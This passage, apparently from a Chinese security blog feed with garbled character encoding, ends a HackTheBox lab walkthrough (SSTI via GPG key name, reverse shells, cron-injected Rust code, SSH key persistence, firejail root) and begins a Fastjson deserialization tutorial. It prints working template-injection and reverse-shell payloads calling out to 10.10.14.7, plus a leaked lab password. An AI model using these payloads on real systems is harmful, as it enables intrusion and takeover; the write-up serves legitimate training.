<p>æŸ¥çœ‹å…¬é’¥<code>public_key.asc</code>å’Œè¢«ç­¾åçš„æ¶ˆæ¯ <code>signed_message.asc</code>ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162229279.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162245776.png"></p>
<p>åˆ†åˆ«å¡«å…¥åˆ°<code>/guide</code>é¡µé¢å¯¹åº”çš„æ–‡æœ¬æ¡†é‡Œï¼ŒéªŒè¯ç­¾å</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162402747.png" style="zoom: 50%;">

<p>å‘ç°å¼¹å‡ºå¦‚ä¸‹å†…å®¹ï¼Œå…¶ä¸­åŒ…å«æœ‰æ‰§è¡Œæ¨¡æ¿æ³¨å…¥è¡¨è¾¾å¼çš„ç»“æœ10000</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162535692.png" style="zoom: 67%;">

<p>ç¡®è®¤å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œå°±å¯ä»¥å°è¯•æ‰§è¡Œå‘½ä»¤ã€‚å…ˆåˆ é™¤ä¹‹å‰ç”Ÿæˆçš„å¯†é’¥å¯¹</p>
<pre class="line-numbers language-none"><code class="language-none">gpg --delete-secret-keys atlas@ssa.htb
gpg --delete-keys atlas@ssa.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102162937665.png" style="zoom: 80%;">

<p>é‡æ–°ç”Ÿæˆå¯†é’¥å¯¹ï¼Œåœ¨<code>Real name</code>å¡«å…¥å¦‚ä¸‹å†…å®¹</p>
<pre class="line-numbers language-none"><code class="language-none">{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102163228026.png"></p>
<p>ç„¶åæŒ‰ç…§ä¹‹å‰çš„æ€è·¯å¯¼å‡ºå…¬é’¥å’Œè¢«ç­¾åçš„æ¶ˆæ¯ï¼Œé‡æ–°éªŒè¯ï¼Œå¼¹çª—å¦‚ä¸‹ï¼Œå‘½ä»¤<code>id</code>è¢«æˆåŠŸæ‰§è¡Œ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102163523356.png" style="zoom: 67%;">

<p>åå¼¹shellå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1"').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102172511899.png"></p>
<p>ç”Ÿæˆå¯†é’¥æç¤º<code>Real name</code>ä¸èƒ½æœ‰å°–æ‹¬å·ï¼Œé‚£å°±æŠŠbase64ç¼–ç payloadï¼Œå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">{{self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzk4OTggMD4mMSI=" | base64 -d | bash').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102172842772.png"></p>
<p>ç„¶åæŒ‰ç…§ä¹‹å‰çš„æ€è·¯éªŒè¯ç­¾åï¼Œå¼€å¯ç›‘å¬ï¼ŒæˆåŠŸè·å–åˆ°<code>atlas</code>ç”¨æˆ·çš„shellæƒé™</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102173053293.png" style="zoom: 80%;">

<p>åœ¨homeç›®å½•çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·<code>silentboserver</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102175857783.png"></p>
<p>åœ¨å¦‚ä¸‹æ–‡ä»¶æ‰¾åˆ°ç”¨æˆ·<code>silentboserver</code>çš„å£ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">/home/atlas/.config/httpie/sessions/localhost_5000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102180054542.png"></p>
<pre class="line-numbers language-none"><code class="language-none">username: silentobserver
password: quietLiketheWind22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>sshè¿æ¥</p>
<pre class="line-numbers language-none"><code class="language-none">ssh silentobserver@10.10.11.218<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231102180300347.png"></p>
<h2 id="å››ã€Rustè®¡åˆ’ä»»åŠ¡ææƒ"><a href="#å››ã€Rustè®¡åˆ’ä»»åŠ¡ææƒ" class="headerlink" title="å››ã€Rustè®¡åˆ’ä»»åŠ¡ææƒ"></a>å››ã€Rustè®¡åˆ’ä»»åŠ¡ææƒ</h2><p>ä¸Šä¼ è¿è¡Œpspy64ï¼Œå¯çœ‹åˆ°æœ‰è®¡åˆ’ä»»åŠ¡ä¼šä»¥<code>atlas</code>ç”¨æˆ·èº«ä»½æ‰§è¡Œ<code>/opt/tipnet</code>ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103143804226.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103143934128.png"></p>
<p>ä¸Šä¼ linpeasï¼Œæ·»åŠ å¯æ‰§è¡Œæƒé™ï¼Œè¿è¡Œï¼Œå‘ç°å¦‚ä¸‹æ–‡ä»¶å­˜åœ¨SUID</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103100443185.png"></p>
<p><code>firejail</code>å¯ä»¥suidææƒï¼Œåˆ©ç”¨è„šæœ¬ï¼š<a href="https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25">https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25</a></p>
<p>ä½†æ˜¯<code>firejail</code>æ–‡ä»¶çš„å±ç»„æ˜¯<code>jailer</code>ï¼Œlinpeasç»“æœå¯ä»¥çœ‹åˆ°<code>atlas</code>ç”¨æˆ·çš„å±ç»„æ˜¯<code>jailer</code>ï¼Œä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬è¿æ¥çš„æ˜¯<code>silentobserver</code>ç”¨æˆ·çš„sshè´¦æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103103658116.png"></p>
<p>ä¹‹å‰æœ‰ä¸ªåå¼¹å¾—åˆ°çš„<code>atlas</code>ç”¨æˆ·çš„shellæƒé™</p>
<p>ç”¨åå¼¹shellçš„å‘½ä»¤è¡Œçª—å£ä»æœ¬åœ°kaliè·å–è„šæœ¬ï¼Œæç¤ºå‘½ä»¤æœªæ‰¾åˆ°ï¼Œé‚£å¯èƒ½è¿™ä¸ªshellæ˜¯webæƒé™ï¼Œæ¯”è¾ƒä½ã€‚æœ‰è®¡åˆ’ä»»åŠ¡ä¼šä»¥<code>atlas</code>ç”¨æˆ·èº«ä»½æ‰§è¡Œ<code>/opt/tipnet</code>ç›®å½•ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•é€šè¿‡æ­¤è®¡åˆ’ä»»åŠ¡æ¥åå¼¹ä¸€ä¸ªshell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103104636857.png"></p>
<p>æ­¤æ—¶çœ‹å¦ä¸€ä¸ªå¯ç–‘çš„suidæ–‡ä»¶ï¼Œåœ¨å®ƒçš„åŒçº§ç›®å½•ä¸‹å‘ç°å¦‚ä¸‹å†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103105843673.png"></p>
<p>å¯¹äº<code>silentobserver</code>ç”¨æˆ·ï¼Œåªæœ‰<code>/opt/crates/logger/src/lib.rs</code>æœ‰å¯å†™æƒé™</p>
<p>å‚è€ƒï¼š<a href="https://doc.rust-lang.org/std/process/struct.Command.html">https://doc.rust-lang.org/std/process/struct.Command.html</a></p>
<p>åœ¨<code>/opt/crates/logger/src/lib.rs</code>æ·»åŠ å¦‚ä¸‹Rustä»£ç ï¼Œå°è¯•åå¼¹shell</p>
<pre class="line-numbers language-none"><code class="language-none">use std::process::Command;

    let output = Command::new("bash")
        .arg("-c")
        .arg("bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1")
        .output()
        .expect("failed to execute process");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103145936364.png"></p>
<p>å¼€å¯ç›‘å¬ï¼Œç¨ç­‰ç‰‡åˆ»ï¼ŒæˆåŠŸåå¼¹è·å¾—atlasç”¨æˆ·jailerç»„çš„shellæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103150047556.png"></p>
<h3 id="sshå…¬é’¥ä¼ªé€ å®ç°æƒé™ç»´æŒ"><a href="#sshå…¬é’¥ä¼ªé€ å®ç°æƒé™ç»´æŒ" class="headerlink" title="sshå…¬é’¥ä¼ªé€ å®ç°æƒé™ç»´æŒ"></a>sshå…¬é’¥ä¼ªé€ å®ç°æƒé™ç»´æŒ</h3><p>ç”±äºæ¯æ¬¡æ‰§è¡Œå®Œæ­¤å®šæ—¶ä»»åŠ¡åï¼Œ<code>/opt/crates/logger/src/lib.rs</code>ä¼šè‡ªåŠ¨æ¢å¤æˆåŸæ¥çš„æ ·å­ã€‚è¿™æ ·å¦‚æœshellæ–­äº†ï¼Œæƒ³è¦é‡è¿ï¼Œåˆè¦é‡æ–°ä¿®æ”¹æ–‡ä»¶å¹¶ç­‰å¾…åå¼¹ã€‚å¦å¤–åœ¨æ­¤å¤„å‘ç°<code>atlas</code>çš„<code>home</code>ç›®å½•ä¸‹æœ‰<code>.ssh</code>ç›®å½•ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•sshå…¬é’¥ä¼ªé€ ç™»å½•ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103152343710.png"></p>
<p>æœ¬åœ°kaliç”Ÿæˆrsaå…¬é’¥å’Œç§é’¥ï¼Œåˆ†åˆ«é»˜è®¤ä¿å­˜åœ¨<code>/root/.ssh/id_rsa.pub</code>å’Œ<code>/root/.ssh/id_rsa</code></p>
<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa	#ä¸¤æ¬¡é»˜è®¤å›è½¦å³å¯<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¼€å¯httpæœåŠ¡ï¼ŒæŠŠå…¬é’¥<code>id_rsa.pub</code>ä¼ è¾“åˆ°ç›®æ ‡é¶æœº<code>/home/atlas/.ssh</code>ç›®å½•ä¸‹ï¼Œå¹¶é‡å‘½åä¸º<code>authorized_keys</code></p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/id_rsa.pub -O authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åæœ¬åœ°æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ç™»å½•ssh</p>
<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa atlas@10.10.11.218<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103153009729.png"></p>
<h2 id="äº”ã€firejail-SUIDææƒ"><a href="#äº”ã€firejail-SUIDææƒ" class="headerlink" title="äº”ã€firejail SUIDææƒ"></a>äº”ã€firejail SUIDææƒ</h2><p>ä¸Šä¼ firejailçš„åˆ©ç”¨è„šæœ¬å¹¶æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103154520467.png"></p>
<p>é‡å¼€ä¸€ä¸ªsshçª—å£ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">firejail --join=&lt;number&gt;
su -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103154538708.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231103154714757.png" style="zoom:67%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Flaskæ¨¡æ¿æ³¨å…¥</tag>
        <tag>Rustè®¡åˆ’ä»»åŠ¡ææƒ</tag>
        <tag>firejailææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjsonç³»åˆ—æ¼æ´å¤ç°åŠåŸç†è°ƒè¯•åˆ†æ</title>
    <url>/posts/d5d1bb40.html</url>
    <content><![CDATA[<h1 id="Fastjsonç³»åˆ—æ¼æ´å¤ç°åŠåŸç†è°ƒè¯•åˆ†æ"><a href="#Fastjsonç³»åˆ—æ¼æ´å¤ç°åŠåŸç†è°ƒè¯•åˆ†æ" class="headerlink" title="Fastjsonç³»åˆ—æ¼æ´å¤ç°åŠåŸç†è°ƒè¯•åˆ†æ"></a>Fastjsonç³»åˆ—æ¼æ´å¤ç°åŠåŸç†è°ƒè¯•åˆ†æ</h1><h2 id="Fastjsonå‰ç½®çŸ¥è¯†"><a href="#Fastjsonå‰ç½®çŸ¥è¯†" class="headerlink" title="Fastjsonå‰ç½®çŸ¥è¯†"></a>Fastjsonå‰ç½®çŸ¥è¯†</h2><h3 id="ä½¿ç”¨Fastjsonè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#ä½¿ç”¨Fastjsonè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="ä½¿ç”¨Fastjsonè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>ä½¿ç”¨Fastjsonè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3><p>å¼€å‘ç¯å¢ƒï¼šIDEA2021.2.1ã€JDK1.7.0_76ï¼ˆæ­¤å¤„é€‰ç”¨1.7.0_76æ˜¯ä¸ºäº†æ–¹ä¾¿åç»­æµ‹è¯•ï¼‰</p>
<p>æ–°å»ºä¸€ä¸ª Maven é¡¹ç›®ï¼Œåç§°å«<code>Fastjson_demo</code>ï¼Œç¼–è¾‘<code>pom.xml</code>æ–‡ä»¶å¦‚ä¸‹</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>Fastjson_demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.source</span><span class="token punctuation">&gt;</span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.source</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.target</span><span class="token punctuation">&gt;</span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.target</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¹‹åå³é”®å•å‡»<code>pom.xml</code>é€‰æ‹©<code>Download Sources and Documentation</code></p>
<p>é¦–å…ˆæ–°å»ºä¸€ä¸ªç®€å•çš„ Student ç±»ï¼Œ<code>Student.class</code>ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªå±æ€§åŠå…¶<code>getter</code>/<code>setter</code>æ–¹æ³•ï¼Œè¿˜æœ‰ç±»çš„æ„é€ å‡½æ•°ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Studentæ„é€ å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="JSON-toJsonString-åŠå…¶SerializerFeature-WriteClassNameå±æ€§"><a href="#JSON-toJsonString-åŠå…¶SerializerFeature-WriteClassNameå±æ€§" class="headerlink" title="JSON.toJsonString()åŠå…¶SerializerFeature.WriteClassNameå±æ€§"></a><code>JSON.toJsonString()</code>åŠå…¶<code>SerializerFeature.WriteClassName</code>å±æ€§</h4><p>ç„¶åæ–°å»ºä¸€ä¸ª<code>TestFastJson.java</code>ï¼Œè°ƒç”¨<code>JSON.toJsonString()</code>æ¥åºåˆ—åŒ– Student ç±»å¯¹è±¡</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFastJson</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        student<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Hello Fastjson!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        student<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>student<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

